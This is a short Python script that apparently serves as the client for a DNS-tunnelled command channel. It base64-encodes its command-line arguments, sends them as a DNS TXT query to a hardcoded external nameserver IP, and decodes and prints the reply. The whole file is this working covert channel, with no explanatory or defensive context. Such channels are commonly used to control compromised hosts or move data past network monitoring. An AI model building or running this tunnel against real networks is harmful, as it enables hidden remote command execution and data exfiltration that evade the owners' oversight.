#!/usr/bin/env python3

import base64
import dns.resolver

import sys

resolver = dns.resolver.Resolver()
resolver.nameservers = ['3.88.57.227']

cmd = base64.b64encode(" ".join(sys.argv[1:]).encode())

print(base64.b64decode(resolver.query(cmd.decode(), "TXT").response.answer[0][-1].strings[0]).decode())
